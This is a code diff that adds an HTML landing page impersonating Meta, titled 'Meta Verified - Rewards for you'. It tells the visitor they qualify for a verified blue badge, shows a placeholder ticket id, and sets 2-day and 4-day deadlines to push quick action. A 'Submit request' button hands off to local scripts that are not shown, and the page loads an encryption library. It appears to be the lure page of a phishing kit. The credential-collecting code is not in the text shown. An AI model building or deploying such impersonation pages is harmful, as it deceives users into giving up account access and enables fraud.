@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified - Rewards for you</title>
+    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="stylesheet" href="./public/styles/style.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+</head>
+
+<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
+    <div class="max-w-[768px] w-full p-4 h-full">
+        <div class="w-full">
+            <div class="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
+                <img src="./public/tick.svg" class="w-12 h-12">
+                <b class="text-[2rem]">Meta Verified - Rewards for you</b>
+            </div>
+
+            <div class="w-full">
+                <div class="w-full mb-[20px]">
+                    <b class="text-[17px]">Show the world that you mean business.</b>
+                    <p class="text-[15px] mb-[0px] mt-[15px]">Congratulations on achieving the requirements to upgrade your page
+                        to a verified blue badge! This is a fantastic milestone that reflects your dedication and the
+                        trust you've built with your audience.</p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]">We're thrilled to celebrate this moment with you and look forward
+                        to seeing your page thrive with this prestigious recognition!</p>
+                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]">Your ticket id: #<span id="ticketId">XXXX-XXXX-XXXX</span></p>
+                </div>
+
+                <div class="w-full">
+                    <p class="mb-[15px]"><b class="text-[17px] font-bold">Verified Blue Badge Request Guide</b></p>
+                    <p class="text-[15px] mb-[10px]">- Fact checkers may not respond to requests containing
+                        intimidation, hate speech, or verbal threats</p>
+                    <p class="text-[15px] mb-[10px]">- In your request, please provide all required information to
+                        ensure timely processing by the fact checker. Submitting an invalid email address or failing to
+                        reply to requests for additional information within 2 days may lead to the application being
+                        closed without review. If the request remains unprocessed after 4 days, Meta will automatically
+                        reject it.</p>
+                    <p class="text-[15px] mb-0">- Once all details are submitted, we will evaluate your account to check
+                        for any restrictions. The verification process typically takes 24 hours, though it may extend in
+                        some cases. Based on our decision, restrictions will either remain or be lifted, and your
+                        account will be updated accordingly.</p>
+                </div>
+            </div>
+        </div>
+
+        <button id="submitRequestBtn" class="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center">
+            Submit request
+        </button>
+
+        <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-4">
+            <a href="#">Help Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Community Standards</a>
+            <a href="#">Meta © 2025</a>
+        </div>
+    </div>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+</body>
+
+</html>
